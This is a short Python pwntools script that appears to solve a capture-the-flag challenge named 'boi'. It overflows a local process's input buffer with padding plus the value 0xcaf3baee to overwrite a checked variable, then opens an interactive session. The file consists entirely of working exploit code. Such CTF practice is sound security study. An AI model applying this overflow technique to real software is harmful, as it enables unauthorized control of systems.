from pwn import *

boi = process("./boi")

buffer = b'AAAABBBBCCCCDDDDEEEE'
buffer += p32(0xcaf3baee)

boi.send(buffer)
boi.interactive()
